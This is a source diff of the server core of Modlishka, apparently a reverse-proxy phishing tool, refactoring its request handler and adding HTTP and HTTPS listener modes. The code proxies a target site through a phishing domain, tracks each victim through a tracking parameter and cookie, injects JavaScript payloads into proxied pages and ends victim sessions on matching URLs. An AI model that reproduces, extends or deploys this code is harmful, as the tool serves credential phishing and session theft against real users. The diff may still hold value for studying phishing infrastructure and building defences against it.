@@ -14,16 +14,18 @@
 
 package core
 
+import "C"
 import (
 	"crypto/tls"
 	"crypto/x509"
 	"errors"
+	"fmt"
 	"github.com/drk1wi/Modlishka/config"
 	"github.com/drk1wi/Modlishka/log"
 	"github.com/drk1wi/Modlishka/plugin"
+	"github.com/drk1wi/Modlishka/runtime"
 	"net"
 	"net/http"
-	"strings"
 )
 
 var ServerRuntimeConfig *ServerConfig
@@ -31,6 +33,7 @@ var ServerRuntimeConfig *ServerConfig
 type ServerConfig struct {
 	config.Options
 	Handler *http.ServeMux
+	Port string
 }
 
 type EmbeddedServer struct {
@@ -43,29 +46,26 @@ type EmbeddedServer struct {
 func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 
 	// Patch the FQDN
+	targetDomain,newTLS,TLSvalue := runtime.TranslateRequestHost(r.Host)
 
-	target := TranslateRequestHost(*conf.Target, r.Host)
-	targetDomain := strings.Replace(target, "https://", "", -1)
-	targetDomain = strings.Replace(targetDomain, "http://", "", -1)
-
-	if !*conf.DisableSecurity && IsValidRequestHost(r.Host, PhishingDomain) == false {
-		log.Infof("Redirecting client to %s", TopLevelDomain)
+	if !*conf.DisableSecurity && runtime.IsValidRequestHost(r.Host, runtime.ProxyDomain) == false {
+		log.Infof("Redirecting client to %s",runtime. TopLevelDomain)
 		Redirect(w, r, "")
 		return
 	}
-	if !*conf.DisableSecurity && len(targetDomain) > 0 && IsRejectedDomain(targetDomain) == true {
-		log.Infof("Redirecting client to %s", TopLevelDomain)
+	if !*conf.DisableSecurity && len(targetDomain) > 0 && runtime.IsRejectedDomain(targetDomain) == true {
+		log.Infof("Redirecting client to %s", runtime.TopLevelDomain)
 		Redirect(w, r, "")
 		return
 	}
 
 	// Check if the session should be terminated
-	if _, err := r.Cookie(TERMINATE_SESSION_COOKIE_NAME); err == nil {
+	if _, err := r.Cookie(runtime.TERMINATE_SESSION_COOKIE_NAME); err == nil {
 		if len(*conf.TerminateRedirectUrl) > 0 {
 			log.Infof("Session terminated; Redirecting client to %s", *conf.TerminateRedirectUrl)
 			Redirect(w, r, *conf.TerminateRedirectUrl)
 		} else {
-			log.Infof("Session terminated; Redirecting client to %s", TopLevelDomain)
+			log.Infof("Session terminated; Redirecting client to %s", runtime.TopLevelDomain)
 			Redirect(w, r, "")
 		}
 		return
@@ -73,28 +73,54 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 
 	// Do a redirect when tracking cookie was already set . We want to get rid of the TrackingParam from the URL!
 	queryString := r.URL.Query()
-	if _, ok := queryString[TrackingParam]; ok {
-		if _, err := r.Cookie(TrackingCookie); err == nil {
-			delete(queryString, TrackingParam)
+	if _, ok := queryString[runtime.TrackingParam]; ok {
+		if _, err := r.Cookie(runtime.TrackingCookie); err == nil {
+			delete(queryString, runtime.TrackingParam)
 			r.URL.RawQuery = queryString.Encode()
 			log.Infof("User tracking: Redirecting client to %s", r.URL.String())
 			Redirect(w, r, r.URL.String())
 		}
 	}
 
-	log.Debugf("[P] Proxying target [%s] via phishing [%s]", target, PhishingDomain)
+	targetURL:=""
+
+
+	if (runtime.ForceHTTP == true || runtime.ForceHTTPS == true) && newTLS  == true {
+
+			if TLSvalue == false {
+				targetURL="http://"+ targetDomain
+			} else {
+				targetURL="https://"+targetDomain
+			}
+
+	} else {
+
+		if r.TLS != nil {
+			targetURL="https://"+targetDomain
+		} else {
+			targetURL="http://"+targetDomain
+		}
+	}
+
+	log.Debugf("[P] Proxying target [%s] via domain [%s]", targetURL, runtime.ProxyDomain)
+
 
 	origin := r.Header.Get("Origin")
-	settings := &Settings{
+	settings := &ReverseProxyFactorySettings{
 		conf.Options,
-		target,
+		targetURL,
 		r.Host,
 		origin,
+		false,
+	}
+
+	if r.TLS != nil {
+		settings.IsTLS = true
 	}
 
 	reverseProxy := settings.NewReverseProxy()
 
-	if CheckTermination(r.Host + r.URL.String()) {
+	if runtime.CheckTermination(r.Host + r.URL.String()) {
 		log.Infof("[P] Time to terminate this victim! Termination URL matched: %s", r.Host+r.URL.String())
 		reverseProxy.Terminate = true
 	}
@@ -104,18 +130,18 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	//set up user tracking variables
-	if val, ok := queryString[TrackingParam]; ok {
+	if val, ok := queryString[runtime.TrackingParam]; ok {
 		reverseProxy.InitPhishUser = val[0]
 		reverseProxy.PhishUser = val[0]
 		log.Infof("[P] Tracking victim via initial parameter %s", val[0])
 	}
 
 	//check if JS Payload should be injected
-	if payload := GetJSRulesPayload(r.Host + r.URL.String()); payload != "" {
+	if payload := runtime.GetJSRulesPayload(r.Host + r.URL.String()); payload != "" {
 		reverseProxy.Payload = payload
 	}
 
-	if cookie, err := r.Cookie(TrackingCookie); err == nil {
+	if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
 		reverseProxy.PhishUser = cookie.Value
 	}
 
@@ -173,19 +199,32 @@ func SetServerRuntimeConfig(conf config.Options) {
 func RunServer() {
 
 	ServerRuntimeConfig.Handler.HandleFunc("/", ServerRuntimeConfig.MainHandler)
+
 	plugin.RegisterHandler(ServerRuntimeConfig.Handler)
 
-	var listener = string(*ServerRuntimeConfig.ListeningAddress) + ":" + string(*ServerRuntimeConfig.ListeningPort)
+	var listener= string(*ServerRuntimeConfig.ListeningAddress)
 
-	log.Infof(`
-
->>>> "Modlishka" Piotr Duszynski @drk1wi - Reverse Proxy started <<<<
+	welcome := fmt.Sprintf(`
 %s
 
-Listening on: [%s] 
-Proxying [%s:%s] via --> [%s] `, Banner, listener, PhishingDomain, *ServerRuntimeConfig.ListeningPort, *ServerRuntimeConfig.Target)
+>>>> "Modlishka" Reverse Proxy started - v.1.1 <<<<
+Author: Piotr Duszynski @drk1wi  
+`, runtime.Banner)
 
-	if *ServerRuntimeConfig.UseTls == true {
+	if *ServerRuntimeConfig.ForceHTTP  {
+
+		var httplistener = listener + ":80"
+		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via --> [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
+		log.Infof("%s", welcome)
+
+		server := &http.Server{Addr: httplistener, Handler: ServerRuntimeConfig.Handler}
+
+		if err := server.ListenAndServe(); err != nil {
+			log.Fatalf("%s . Terminating.", err)
+		}
+
+	} else if *ServerRuntimeConfig.ForceHTTPS  {
+
 
 		embeddedTLSServer := &EmbeddedServer{
 			WebServerCertificate:     *ServerRuntimeConfig.TLSCertificate,
@@ -195,18 +234,54 @@ Proxying [%s:%s] via --> [%s] `, Banner, listener, PhishingDomain, *ServerRuntim
 
 		embeddedTLSServer.Handler = ServerRuntimeConfig.Handler
 
-		err := embeddedTLSServer.ListenAndServeTLS(listener)
+		var httpslistener= listener + ":443"
+
+		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
+
+		log.Infof("%s", welcome)
+
+
+		err := embeddedTLSServer.ListenAndServeTLS(httpslistener)
 		if err != nil {
 			log.Fatalf(err.Error() + " . Terminating.")
 		}
 
-	} else {
 
-		server := &http.Server{Addr: listener, Handler: ServerRuntimeConfig.Handler}
+	} else { 	//default mode
 
-		if err := server.ListenAndServe(); err != nil {
-			log.Fatalf("%s . Terminating.", err)
+		embeddedTLSServer := &EmbeddedServer{
+				WebServerCertificate:     *ServerRuntimeConfig.TLSCertificate,
+				WebServerKey:             *ServerRuntimeConfig.TLSKey,
+				WebServerCertificatePool: *ServerRuntimeConfig.TLSPool,
+			}
+
+			embeddedTLSServer.Handler = ServerRuntimeConfig.Handler
+
+			var HTTPServerRuntimeConfig = &ServerConfig{
+				Options: ServerRuntimeConfig.Options,
+				Handler: ServerRuntimeConfig.Handler,
+				Port:    "80",
+			}
+
+			var httpslistener= listener + ":443"
+			var httplistener= listener + ":80"
+
+			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
+			welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
+
+			log.Infof("%s", welcome)
+
+			go func() {
+				server := &http.Server{Addr: httplistener, Handler: HTTPServerRuntimeConfig.Handler}
+				if err := server.ListenAndServe(); err != nil {
+					log.Fatalf("%s . Terminating.", err)
+				}
+			}()
+
+			err := embeddedTLSServer.ListenAndServeTLS(httpslistener)
+			if err != nil {
+				log.Fatalf(err.Error() + " . Terminating.")
+			}
+
 		}
 	}
-
-}
